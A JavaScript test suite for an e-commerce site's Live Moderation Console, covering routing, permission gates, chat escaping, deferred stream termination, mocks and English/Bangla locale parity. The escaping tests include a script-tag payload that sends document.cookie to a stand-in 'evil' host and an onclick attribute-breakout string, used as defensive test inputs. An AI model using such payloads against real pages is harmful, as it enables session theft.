/**
 * liveModerationPage.test.js — Client invariants for the Live Moderation Console (/moderator/live).
 *
 *   1. Routing — the moderator route must not fall back to the customer shopping page.
 *   2. Escaping — live chat is viewer-authored and reaches innerHTML.
 *   3. Maker-checker — a HIGH-tier terminate returns 202 and must never be reported as done.
 *   4. Mock parity — the mock serves the shape the page renders.
 *   5. Locale — every string the console renders exists in both dictionaries.
 */

import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import liveHandlers from '../src/mocks/handlers/live.js';

const root = path.resolve(import.meta.dirname, '..', '..');
const readText = (rel) => fs.readFileSync(path.resolve(root, rel), 'utf8');
const readJson = (rel) => JSON.parse(readText(rel));

const pageSrc = readText('client/src/pages/moderator/LiveModerationPage.js');
const mainSrc = readText('client/src/main.js');
const en = readJson('client/src/locales/en.json');
const bn = readJson('client/src/locales/bn.json');

const handler = (method, p) => liveHandlers.find((h) => h.method === method && h.path === p);

test('Live Moderation Console — routing', async (t) => {
  await t.test('1. /moderator/live loads the console, not the customer live page', () => {
    // The nav item sits under REVIEW QUEUES and its title says "Live Moderation", but the route
    // used to load pages/LiveStreamPage.js — the shopping browse page, complete with a
    // "Host a Live Stream" call to action and no moderation control anywhere on it.
    const line = mainSrc.split('\n').find((l) => l.includes("path: '/moderator/live'"));
    assert.ok(line, 'the /moderator/live route must exist');
    assert.match(line, /moderator\/LiveModerationPage\.js/, 'it must load the moderation console');
    assert.ok(!/pages\/LiveStreamPage\.js/.test(line), 'it must not load the customer live page');
  });

  await t.test('2. The route keeps its permission and module gates', () => {
    const line = mainSrc.split('\n').find((l) => l.includes("path: '/moderator/live'"));
    assert.match(line, /permission: 'moderation\.live\.handle'/);
    assert.match(line, /module: 'live_commerce'/);
    assert.match(line, /requiresAuth: true/);
  });

  await t.test('3. The page tears down its poll on navigation away', () => {
    // The console polls a running broadcast every 10s. Without a cleanup the interval outlives the
    // page and keeps firing for the rest of the session.
    assert.match(pageSrc, /return \(\) => \{[\s\S]*clearInterval\(pollTimer\)/, 'must return a cleanup');
  });
});

test('Live Moderation Console — escaping viewer-authored chat', async (t) => {
  // Mirrors esc() in LiveModerationPage.js.
  const esc = (value) =>
    value == null
      ? ''
      : String(value)
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#39;');

  await t.test('1. A script tag typed into live chat is neutralised', () => {
    const out = esc('<script>fetch("//evil?c="+document.cookie)</script>');
    assert.ok(!out.includes('<script'), 'no live tag survives');
  });

  await t.test('2. A quote in a display name cannot break out of an attribute', () => {
    // The mute button carries the sender name in data-mute-name.
    const out = esc('Rakib" onclick="alert(1)');
    assert.ok(!out.includes('onclick="'), 'the injected handler is inert');
  });

  await t.test('3. Bangla chat and ampersands survive readably', () => {
    assert.equal(esc('এটা কি খাঁটি কটন?'), 'এটা কি খাঁটি কটন?');
    assert.equal(esc('Silk & Cotton'), 'Silk &amp; Cotton');
  });

  await t.test('4. Every viewer-authored field reaches the DOM through esc()', () => {
    // Checks each `${…}` interpolation that touches an untrusted field, rather than looking for a
    // literal `esc(field)` — several of these carry a `?? '—'` fallback inside the call.
    const interpolations = [...pageSrc.matchAll(/\$\{([^}]*)\}/g)].map((m) => m[1]);
    const untrusted = [
      'm.content',
      'm.user_name',
      'm.deletion_reason',
      'm.deleted_by_name',
      'stream.title',
      'stream.host_name',
      'stream.store_name',
      'stream.termination_reason',
      'entry.content',
      'entry.actor_name',
      's.title',
      's.host_name',
    ];

    for (const field of untrusted) {
      const uses = interpolations.filter((expr) => expr.includes(field));
      assert.ok(uses.length > 0, `${field} should be rendered somewhere`);
      for (const expr of uses) {
        assert.ok(
          /\besc\(/.test(expr) || /\bt\(/.test(expr),
          `${field} is viewer- or seller-authored and must be escaped — found raw: \${${expr}}`
        );
      }
    }
  });
});

test('Live Moderation Console — maker-checker on terminate', async (t) => {
  await t.test('1. The mock defers a moderator terminate instead of executing it', () => {
    // live.stream.terminate is HIGH tier, so requirePermission files a pending_admin_action and
    // returns 202 rather than stopping the broadcast. A mock that terminated outright would hide
    // that path from every moderator testing in dev.
    const h = handler('POST', '/live/streams/:id/moderate/terminate');
    assert.ok(h, 'terminate must be mocked');

    const res = h.handler({ params: { id: 1 }, body: { reason: 'Counterfeit goods' } });
    assert.equal(res.status, 202);
    assert.equal(res.body.deferred.code, 'PERMISSION_PENDING_APPROVAL');
    assert.equal(res.body.deferred.action_key, 'live.stream.terminate');
    assert.ok(!res.body.data, 'nothing is returned as if it had happened');
  });

  await t.test('2. The page reports a deferral as pending, never as success', () => {
    const terminateFn = pageSrc.slice(
      pageSrc.indexOf('async function terminateStream('),
      pageSrc.indexOf('// ── rendering')
    );
    assert.match(terminateFn, /res\.deferred/, 'the 202 envelope must be checked');

    const deferredBranch = terminateFn.slice(terminateFn.indexOf('if (res.deferred)'));
    const pendingLine = deferredBranch.slice(0, deferredBranch.indexOf('} else'));
    assert.match(pendingLine, /terminate_pending/, 'a deferral shows the pending copy');
    assert.ok(!/terminate_success/.test(pendingLine), 'a deferral must not claim success');
  });

  await t.test('3. The console warns about sign-off before the click, not after', () => {
    assert.match(pageSrc, /notice: t\('live_mod\.terminate_maker_checker'\)/);
    assert.match(
      en.live_mod.terminate_maker_checker,
      /Super Admin/,
      'the notice must name who has to sign off'
    );
  });
});

test('Live Moderation Console — mock parity with the rendered shape', async (t) => {
  await t.test('1. The stream list carries the triage counts the rail renders', () => {
    const res = handler('GET', '/live/moderation/streams').handler({ query: {} });
    assert.equal(res.status, 200);
    const streams = res.body.data.streams;
    assert.ok(streams.length > 0);
    for (const s of streams) {
      for (const field of ['chat_message_count', 'removed_message_count', 'flagged_count', 'muted_count']) {
        assert.equal(typeof s[field], 'number', `stream ${s.id} is missing ${field}`);
      }
    }
  });

  await t.test('2. LIVE broadcasts sort ahead of everything else', () => {
    const res = handler('GET', '/live/moderation/streams').handler({ query: { status: 'ALL' } });
    const statuses = res.body.data.streams.map((s) => s.status);
    const firstNonLive = statuses.findIndex((s) => s !== 'LIVE');
    if (firstNonLive !== -1) {
      assert.ok(
        !statuses.slice(firstNonLive).includes('LIVE'),
        'a running broadcast is the only one still stoppable, so it must sort first'
      );
    }
  });

  await t.test('3. The feed returns messages, flags, mutes and an action log', () => {
    const res = handler('GET', '/live/moderation/streams/:id').handler({ params: { id: 1 }, query: {} });
    assert.equal(res.status, 200);
    const feed = res.body.data;
    for (const key of ['stream', 'messages', 'action_log', 'mutes', 'flagged_count', 'removed_count']) {
      assert.ok(key in feed, `the feed must carry ${key}`);
    }
    assert.ok(feed.messages.some((m) => m.flags?.length > 0), 'the fixture exercises the flagged state');
    assert.ok(feed.messages.some((m) => m.deleted_at), 'the fixture exercises the removed state');
  });

  await t.test('4. An unknown stream is a 404, not an empty console', () => {
    const res = handler('GET', '/live/moderation/streams/:id').handler({ params: { id: 9999 }, query: {} });
    assert.equal(res.status, 404);
    assert.equal(res.body.error.code, 'STREAM_NOT_FOUND');
  });

  await t.test('5. Removing a message tombstones it and clears its flags', () => {
    const feedFor = () => handler('GET', '/live/moderation/streams/:id').handler({ params: { id: 1 }, query: {} }).body.data;
    const target = feedFor().messages.find((m) => !m.deleted_at && m.flags?.length > 0);
    assert.ok(target, 'need a flagged message to remove');

    const res = handler('POST', '/live/streams/:id/moderate/messages/:messageId/remove').handler({
      params: { id: 1, messageId: target.id },
      body: { reason: 'Sharing off-platform contact details' },
    });
    assert.equal(res.status, 200);

    const after = feedFor().messages.find((m) => m.id === target.id);
    assert.ok(after.deleted_at, 'the message is marked removed');
    assert.equal(after.deletion_reason, 'Sharing off-platform contact details');
    assert.deepEqual(after.flags, [], 'a removed message no longer counts as awaiting attention');

    // Removing the same message again must not succeed a second time.
    const again = handler('POST', '/live/streams/:id/moderate/messages/:messageId/remove').handler({
      params: { id: 1, messageId: target.id },
      body: {},
    });
    assert.equal(again.status, 404);
  });

  await t.test('6. Mute then unmute round-trips through the feed', () => {
    const mutesFor = () => handler('GET', '/live/moderation/streams/:id').handler({ params: { id: 1 }, query: {} }).body.data.mutes;

    handler('POST', '/live/streams/:id/moderate/mute').handler({
      params: { id: 1 },
      body: { target_user_id: 58, duration_minutes: 30, reason: 'Harassment' },
    });
    assert.ok(mutesFor().some((m) => m.user_id === 58), 'the mute shows up in the feed');

    const res = handler('POST', '/live/streams/:id/moderate/unmute').handler({
      params: { id: 1 },
      body: { target_user_id: 58 },
    });
    assert.equal(res.body.data.was_muted, true);
    assert.ok(!mutesFor().some((m) => m.user_id === 58), 'the mute is gone');

    const noop = handler('POST', '/live/streams/:id/moderate/unmute').handler({
      params: { id: 1 },
      body: { target_user_id: 58 },
    });
    assert.equal(noop.body.data.was_muted, false, 'lifting a mute nobody had is a no-op');
  });
});

test('Live Moderation Console — locale integrity', async (t) => {
  await t.test('1. en/bn parity across live_mod', () => {
    assert.ok(en.live_mod, 'en needs a live_mod section');
    assert.ok(bn.live_mod, 'bn needs a live_mod section');
    assert.deepEqual(
      Object.keys(en.live_mod).sort(),
      Object.keys(bn.live_mod).sort(),
      'every English key needs a Bangla counterpart'
    );
  });

  await t.test('2. Every key the page renders exists in both dictionaries', () => {
    const keys = [...pageSrc.matchAll(/t\('(live_mod\.[a-z_]+)'/g)].map((m) => m[1]);
    assert.ok(keys.length > 30, 'the console renders a lot of copy');
    for (const key of new Set(keys)) {
      const leaf = key.split('.')[1];
      assert.equal(typeof en.live_mod[leaf], 'string', `missing EN ${key}`);
      assert.equal(typeof bn.live_mod[leaf], 'string', `missing BN ${key}`);
    }
  });

  await t.test('3. Action-log labels exist for every action the service emits', () => {
    // The log renders t(`live_mod.log_action_${action}`); an unmapped action would fall through to
    // a humanised slug like "Log Action Remove Message".
    for (const action of ['MUTE', 'UNMUTE', 'REMOVE_MESSAGE', 'TERMINATE']) {
      assert.equal(typeof en.live_mod[`log_action_${action}`], 'string', `missing EN label for ${action}`);
      assert.equal(typeof bn.live_mod[`log_action_${action}`], 'string', `missing BN label for ${action}`);
    }
  });

  await t.test('4. No user-facing string is hardcoded English in the markup', () => {
    // Every rendered label goes through t(); toast fallbacks after a network failure are the one
    // deliberate exception, since they are error text of last resort.
    const rendered = pageSrc.match(/>[A-Z][a-z]+ [a-z]{3,}[^<{]*</g) ?? [];
    assert.deepEqual(rendered, [], `hardcoded English in markup: ${rendered.join(' | ')}`);
  });
});

test('Live Moderation Console — broadcast preview', async (t) => {
  await t.test('1. The mock serves the preview shape the console renders', () => {
    const route = liveHandlers.find(
      (h) => h.method === 'GET' && h.path === '/live/moderation/streams/:id'
    );
    assert.ok(route, 'moderation feed route is mocked');

    const live = route.handler({ params: { id: '1' }, query: {} }).body.data.preview;
    assert.equal(live.mode, 'LIVE');
    assert.equal(live.hidden, true, 'the mock rehearses covert observation, not a visible join');
    assert.equal(live.can_publish_data, false);
    assert.ok(live.token && live.expires_at);

    const saver = route.handler({ params: { id: '1' }, query: { audio_only: 'true' } }).body.data.preview;
    assert.equal(saver.audio_only, true);

    const scheduled = route.handler({ params: { id: '2' }, query: {} }).body.data.preview;
    assert.equal(scheduled.mode, 'NOT_STARTED');

    const ended = route.handler({ params: { id: '3' }, query: {} }).body.data.preview;
    assert.equal(ended.mode, 'RECORDING');
    assert.ok(ended.recording_url);

    // The case that bites: cut before the recorder captured anything.
    const terminated = route.handler({ params: { id: '4' }, query: {} }).body.data.preview;
    assert.equal(terminated.mode, 'UNAVAILABLE');
  });

  await t.test('2. The page handles every preview mode the server can return', () => {
    for (const mode of ['LIVE', 'RECORDING', 'NOT_STARTED', 'UNAVAILABLE']) {
      assert.ok(
        pageSrc.includes(`preview.mode === '${mode}'`),
        `preview mode ${mode} is unhandled in the console`
      );
    }
  });

  await t.test('3. Data saver is re-fetched, not merely muted in the browser', () => {
    // audio_only changes the token the server mints. Flipping a client-side flag without a refetch
    // would still pull full video over the moderator's connection while claiming otherwise.
    assert.match(pageSrc, /audio_only=\$\{audioOnly \? 'true' : 'false'\}/);
    assert.match(pageSrc, /audioOnly = e\.target\.checked;[\s\S]{0,120}fetchFeed\(selectedId\)/);
  });

  await t.test('4. Leaving the console stops pulling the broadcast', () => {
    // Detaching a <video> is not enough — the connection stays open until src is cleared.
    const cleanup = pageSrc.slice(pageSrc.lastIndexOf('return () => {'));
    assert.match(cleanup, /videoEl\.pause\(\)/);
    assert.match(cleanup, /removeAttribute\('src'\)/);
  });

  await t.test('5. The player survives the 10s poll instead of restarting twice a minute', () => {
    // The feed re-renders on every poll. A <video> serialised into innerHTML would tear down and
    // restart each time, which is fatal for someone watching for one bad moment.
    assert.ok(pageSrc.includes('preview-video-mount'), 'the player is mounted, not re-serialised');
    assert.match(pageSrc, /function ensureVideoEl\(/);
    assert.ok(
      !/<video[^>]*\$\{/.test(pageSrc),
      'no <video> is built inside a template literal'
    );
  });

  await t.test('6. The moderator is told they are hidden, before they act on what they see', () => {
    assert.ok(pageSrc.includes('live_mod.preview_observer_notice'));
    assert.match(en.live_mod.preview_observer_notice, /cannot see/i);
    assert.match(en.live_mod.preview_observer_notice, /logged/i);
  });
});
